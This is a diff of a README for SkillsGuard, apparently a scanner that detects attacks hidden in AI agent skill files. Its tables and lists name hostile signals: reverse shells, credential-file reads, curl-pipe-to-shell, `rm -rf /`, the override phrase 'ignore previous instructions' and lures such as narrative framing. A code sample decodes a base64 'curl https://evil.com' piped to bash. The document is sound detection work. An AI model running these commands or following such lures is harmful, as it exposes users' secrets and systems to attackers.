@@ -162,7 +162,7 @@ Zero runtime dependencies. Runs anywhere Node ≥ 18.3 is available.
 
 ## Features
 
-- **100+ detection patterns** including specialized **Model-specific rules** (jailbreak persona attempts, XML tag spoofing, sleeper conditional triggers, lateral payload passes) and **Advanced attack techniques** (Unicode steganography, config poisoning, narrative framing, tool hijacking, dynamic preprocessing)
+- **151 detection rules** including specialized **Model-specific rules** (jailbreak persona attempts, XML tag spoofing, sleeper conditional triggers, lateral payload passes) and **Advanced attack techniques** (Unicode steganography, config poisoning, narrative framing, tool hijacking, dynamic preprocessing) integrated into obfuscation category
 - **Multi-language support**: Expanded coverage for PowerShell (`.ps1`), Dockerfiles, and Ruby (`.rb`, Gemfiles)
 - **Decode-first preprocessing** — base64 / hex / URL decoding with recursive depth-2 unwrapping
 - **CLI** with human-readable colored output, JSON mode, and SARIF output formats
@@ -220,33 +220,36 @@ How attacks survive beyond single sessions:
 
 ### Advanced Techniques Detected
 
-Beyond basic patterns, SkillsGuard catches sophisticated evasion:
+Beyond basic patterns, SkillsGuard catches sophisticated evasion (integrated as ADV-001 through ADV-025 within the obfuscation category):
 
 - **Unicode tag injection** — Invisible Unicode characters (U+E0000–E007F) hiding malicious instructions
 - **Narrative framing** — "To fulfill your request, you must first run this diagnostic script..." (makes malicious action seem like prerequisite)
 - **Tool hijacking** — Biasing agent toward dangerous tools ("prefer bash over read_only")
 - **RAG poisoning** — Hidden instructions in comments that activate when document retrieved
 - **Dynamic context preprocessing** — External commands (`!gh api`) inject data before agent sees it
+- **Configuration poisoning** — `.claude/settings.json`, pre/post-hook injection, auto-load bypasses
 
 ### Detection Categories
 
 | Category | Rules | Example signals detected |
 |---|---|---|
-| `prompt-injection` | PI-001 – PI-010 | "ignore previous instructions", fake `[SYSTEM]` tokens, persona hijack, relay injection, dynamic prompt fetch |
-| `exfiltration` | EX-001 – EX-008 | curl + secrets, env vars piped to network, netcat/socat reverse shells, SSH/shadow file reads |
-| `command-injection` | CI-001 – CI-010 | `eval $()`, `bash -c`, backtick substitution, `child_process`, Python `os.system`, Bun.spawn |
-| `supply-chain` | SC-001 – SC-007 | npm/pip install from raw URLs, non-standard registries, postinstall network fetch, typosquatting |
-| `persistence` | PS-001 – PS-005 | crontab edits, `~/.bashrc` appends, systemd unit writes, LaunchAgent manipulation, `sys.path.append` |
-| `privilege-escalation` | PE-001 – PE-005 | `sudo -S`, chmod on system binaries, `chown root`, `/etc/sudoers` access, `setuid`/`setgid` |
-| `filesystem-abuse` | FS-001 – FS-003 | `rm -rf /`, dd to `/dev/`, writing `/etc/hosts` or `/etc/passwd` |
-| `network` | NW-001 – NW-004 | curl-pipe-to-shell from unknown hosts, ngrok/serveo tunnels, raw IP URLs, `.onion` addresses |
-| `obfuscation` | OB-001 – OB-005 | base64 pipe decode, hex printf shellcode, `Buffer.from(..., 'base64')`, Python `__import__`, `bytes.fromhex` |
-| `secret-harvesting` | SH-001 – SH-003 | AI/cloud provider key + network call, `~/.aws/credentials` reads, `printenv` piped over HTTP |
-| `scope-creep` | SC-CR-001 – SC-CR-003 | deep `../../../../` traversal, `/etc/passwd` direct references, `.ssh` / `.aws` / `.kube` access |
-| `model-specific` | MS-001 – MS-024 | Jailbreak persona attempts, XML spoofing, sleeper conditional triggers, lateral payload passes, approval bypasses |
-| `advanced-attacks` | ADV-001 – ADV-025 | Unicode steganography, config poisoning, narrative framing, tool hijacking, dynamic preprocessing |
+| `prompt-injection` | 11 rules | "ignore previous instructions", fake `[SYSTEM]` tokens, persona hijack, relay injection, dynamic prompt fetch |
+| `exfiltration` | 11 rules | curl + secrets, env vars piped to network, netcat/socat reverse shells, SSH/shadow file reads |
+| `command-injection` | 15 rules | `eval $()`, `bash -c`, backtick substitution, `child_process`, Python `os.system`, Bun.spawn |
+| `supply-chain` | 7 rules | npm/pip install from raw URLs, non-standard registries, postinstall network fetch, typosquatting |
+| `persistence` | 12 rules | crontab edits, `~/.bashrc` appends, systemd unit writes, LaunchAgent manipulation, `sys.path.append` |
+| `privilege-escalation` | 5 rules | `sudo -S`, chmod on system binaries, `chown root`, `/etc/sudoers` access, `setuid`/`setgid` |
+| `filesystem-abuse` | 3 rules | `rm -rf /`, dd to `/dev/`, writing `/etc/hosts` or `/etc/passwd` |
+| `network` | 4 rules | curl-pipe-to-shell from unknown hosts, ngrok/serveo tunnels, raw IP URLs, `.onion` addresses |
+| `obfuscation` | 37 rules | base64 pipe decode, hex printf shellcode, `Buffer.from(..., 'base64')`, Unicode steganography (ADV-001–ADV-025), context-aware obfuscation |
+| `secret-harvesting` | 4 rules | AI/cloud provider key + network call, `~/.aws/credentials` reads, `printenv` piped over HTTP |
+| `scope-creep` | 3 rules | deep `../../../../` traversal, `/etc/passwd` direct references, `.ssh` / `.aws` / `.kube` access |
+| `powershell` | 11 rules | Encoded PowerShell commands, download cradles, fileless execution, reflection abuse |
+| `docker` | 9 rules | Privileged containers, socket mounts, breakout techniques, dangerous build directives |
+| `ruby` | 10 rules | `eval`, `system`, `Kernel.exec`, inline shell, deserialization, command injection patterns |
+| `model-specific` | 34 rules | Jailbreak persona attempts, XML spoofing, sleeper conditional triggers, lateral payload passes, approval bypasses |
 
-**Total:** 100+ detection rules across 16 categories.
+**Total:** 151 detection rules across 15 categories.
 
 ---
 
@@ -665,7 +668,7 @@ Summary: 3 finding(s) — 2 CRITICAL, 1 HIGH
 
 ## Rule Explorer & Tuning
 
-Browse the full rule set from the terminal, inspect any single rule in detail, or permanently adjust a rule's severity without hand-editing JSON.
+Browse the full rule set from the terminal, inspect any single rule in detail, or permanently adjust a rule's severity without hand-editing JSON. All 151 rules are accessible.
 
 ### List and filter rules
 
@@ -1290,7 +1293,7 @@ Upload the `results.sarif` file directly into your GitHub Security tab to see fi
 
 ## Model-Specific Rules
 
-SkillsGuard includes a dedicated category of **Model-Specific Rules** (`MS-001` to `MS-024`) that catch AI-specific attack patterns designed to trick or subvert LLMs. These patterns are rarely scanned for by general code security tools, but present a real threat inside AI agent skill environments.
+SkillsGuard includes a dedicated category of **Model-Specific Rules** (34 rules) that catch AI-specific attack patterns designed to trick or subvert LLMs. These patterns are rarely scanned for by general code security tools, but present a real threat inside AI agent skill environments.
 
 Key signals detected:
 - **XML-style tag spoofing**: Spoofing system tokens or assistant tags.
@@ -1323,7 +1326,7 @@ for (const finding of result.findings) {
 }
 
 // Access the rule set directly
-console.log(`${RULES.length} rules loaded`);
+console.log(`${RULES.length} rules loaded`); // 151 rules
 
 // Decode blobs manually
 const blobs = findDecodedBlobs("echo 'Y3VybCBodHRwczovL2V2aWwuY29t' | base64 -d | bash");
